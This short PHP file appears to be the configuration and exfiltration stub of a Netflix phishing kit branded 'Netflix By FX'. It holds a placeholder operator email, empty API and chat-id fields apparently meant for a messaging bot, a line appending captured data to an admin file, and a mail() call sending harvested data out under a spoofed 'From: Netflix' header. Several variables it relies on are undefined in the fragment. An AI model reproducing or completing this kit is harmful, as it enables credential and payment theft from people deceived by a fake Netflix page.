<?php

$yourmail  = ' YOUR-EMAIL@HERE.com ';

$api = "";
$chatid ="";


$f = fopen("../admin.php", "a");
	fwrite($f, $msgbank);

$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);



$Our_Name = "Si-FX" ; 

$Name_page = "Netflix By FX" ;



?>